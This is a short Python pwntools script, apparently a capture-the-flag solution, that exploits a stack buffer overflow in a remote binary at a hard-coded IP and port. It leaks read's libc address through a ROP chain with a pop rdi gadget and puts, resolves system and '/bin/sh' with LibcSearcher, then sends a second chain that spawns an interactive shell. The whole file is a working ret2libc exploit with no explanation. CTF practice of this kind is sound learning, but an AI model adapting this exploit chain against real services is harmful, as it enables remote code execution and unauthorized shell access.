from pwn import *
from LibcSearcher import *
context(arch='amd64', os='linux', log_level='debug')

if __name__ == '__main__':
    elf = ELF('./pwn')
    # io = process('./pwn')
    io = remote('111.200.241.244', 52744)

    poprdi_ret_addr = 0x400763
    puts_addr = 0x4006B1
    main_addr = 0x4006B8
    
    payload1 = cyclic(0x48) + p64(poprdi_ret_addr) + \
    		   p64(elf.got['read']) + p64(elf.plt['puts']) + \
    		   p64(main_addr) + cyclic(96)
    io.send(payload1)
    io.recvuntil(b'bye~\n')
    read_addr = u64(io.recv()[0:-1] + b'\x00' * 2)
    
    libc = LibcSearcher('read', read_addr)
    libc_offset = read_addr - libc.dump('read')
    system_addr = libc_offset + libc.dump('system')
    bin_sh_addr = libc_offset + libc.dump('str_bin_sh')
    
    payload2 = cyclic(0x48) + p64(poprdi_ret_addr) + \
    		   p64(bin_sh_addr + 1) + p64(system_addr) + cyclic(104)
    io.send(payload2)
    io.interactive()

